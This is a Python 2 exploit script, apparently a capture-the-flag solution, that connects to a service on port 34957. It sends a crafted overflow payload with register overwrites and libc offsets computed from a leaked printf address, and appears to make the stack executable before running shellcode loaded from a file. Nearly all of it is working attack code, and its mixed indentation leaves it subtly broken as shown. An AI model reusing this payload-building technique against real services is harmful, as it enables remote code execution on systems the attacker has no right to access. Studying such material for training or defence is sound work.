#!/usr/bin/env python  

import socket
import sys
import binascii
import struct

PORT = 34957
SIZE = 4000

SHELLCODE_FILENAME = "shellcode.bin"

def get_response( sockfd ):
	response = ""
	while True:
		data = sockfd.recv(1)
		
		#print data
		
		if not data:
			break

		if data == ']':
			response += data
			
			data = sockfd.recv(1)
			
			if ( data == ':' ):
				response += data
				break

			if not data:
				break

		response += data
		
	return response

def send_solution( sockfd, stack_address, printf_address ):


	exploit_data = "cheap "
	exploit_data += struct.pack( '<I', 0x0 )
	exploit_data += 'AA'
        exploit_data += ('AAAA'* 6)
	# Set the ESI register (it is used as a temporary stack for the shellcode) it will set it to ESI+0x100 which should be past our shellcode
	exploit_data += struct.pack( '<I', (stack_address - 0x2d8) )
	exploit_data += 'AAAA'
	# Set the EBP register
	exploit_data += struct.pack( '<I', (stack_address - 0x2f0) )
	
	# Use this offset for libc.2-19.so
	#exploit_data += struct.pack( '<I', (printf_address + 0x9A750) )
	exploit_data += struct.pack( '<I', (printf_address + 0x9F120) )
	#
	exploit_data += struct.pack( '<I', (stack_address - 0x2d8) )	
	print "Stack address %X is %X\n" % (stack_address, (stack_address & 0xFFFFF000))
	print "Packed is: "
	print binascii.hexlify(struct.pack( '<I', (stack_address & 0xFFFFF000) ))
	#exploit_data += struct.pack( '<I', 0x42424242 )	
	exploit_data += struct.pack( '<I', (stack_address & 0xFFFFF000) )
	exploit_data += struct.pack( '<I', 0x1000 )
	exploit_data += struct.pack( '<I', 0x7 )
	exploit_data += struct.pack( '<I', 0x43434343 )
	
	with open( SHELLCODE_FILENAME, "rb") as f:
                byte = f.read(1)
                while byte != b"":
                        exploit_data += byte
                        byte = f.read(1)
	
        print "Sending solution length: %d\n" % len(exploit_data)
        print "Solution: "
        print binascii.hexlify(exploit_data)

        sockfd.send(exploit_data + '\n')
	sockfd.send('\n')

try:
    host = sys.argv[1]

except:     # Add localhost as the server if no host provided  
    host = "127.0.0.1"

try:
    sockfd = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

except socket.error, e:
        print "Error while Creating socket : ", e
        sys.exit(1)

try:
        sockfd.connect((host,PORT))

except socket.gaierror, e:
     print "Error (Address-Related) while Connecting to server : ", e

except socket.error , e:
        print "Error while Connecting to Service : ", e
        sys.exit(1)

try:
        while 1:
		result = get_response( sockfd )
        	print result

		cmd = raw_input("")

		if ( cmd.find("send") != -1 ):
			cmd_info = cmd.split()

			send_solution( sockfd, int(cmd_info[1], 16), int(cmd_info[2], 16 ) )
		else:
			sockfd.sendall( cmd + '\n' )


except KeyboardInterrupt:
	sockfd.shutdown(0)



def connect_service( ):
	
	return None
